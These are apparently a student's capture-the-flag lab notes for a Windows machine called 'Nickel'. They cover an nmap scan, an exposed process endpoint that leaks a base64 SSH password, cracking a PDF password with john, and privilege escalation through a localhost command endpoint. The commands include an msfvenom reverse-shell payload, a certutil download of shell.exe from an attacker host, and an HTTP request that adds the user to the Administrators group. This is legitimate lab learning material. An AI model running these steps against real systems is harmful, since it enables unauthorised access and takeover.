# Nickel
# date 20/8/2023
# ip 192.168.172.99

hardcoded ssh creds found on web dev tool >> ftp pdf file found in ftp folder >> cracked by john >> found cmd endpoint ad administrator >> user added to administrator group >> refresh ssh session >> got flag 

# nmap
PORT     STATE SERVICE       REASON  VERSION
21/tcp   open  ftp           syn-ack FileZilla ftpd
22/tcp   open  ssh           syn-ack OpenSSH for_Windows_8.1 (protocol 2.0)
80/tcp   open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack
3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
8089/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)




curl -d "" -X POST http://192.168.172.99:33333/list-running-procs
name        : cmd.exe
commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p 
              "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh

echo "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" | base64 -d 

got ssh creds

ariah:NowiseSloopTheory139


systemctl start ssh.socket 

scp ariah@192.168.172.99:C:/ftp/Infrastructure.pdf . 
ariah4168        (Infrastructure.pdf)     
Password “ariah4168” is recovered. Let’s open the file.

Let’s try and use the command endpoint.

# priv esc
ariah@NICKEL C:\Users\ariah>curl http://localhost/?whoami
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.190 LPORT=80 -f exe > shell.exe
certutil.exe -urlcache -split -f "http://192.168.45.190:8080/shell.exe" 

ariah@NICKEL C:\Users\ariah>curl http://localhost/?cmd /c dir c:\users\ariah\
ariah@NICKEL C:\Users\ariah>curl http://localhost/?cmd%20%2Fc%20dir%20c%3A%5Cusers%5Cariah%5C
ariah@NICKEL C:\Users\ariah>curl http://localhost/?cmd%20%2Fc%20dir%20c%3A%5Cusers%5Cariah%5Cshell.exe



# works
$Resp = Invoke-WebRequest 'http://nickel/?net localgroup Administrators ariah /add' -UseBasicParsing

$Resp.RawContent

PS C:\Users\ariah> net localgroup Administrators

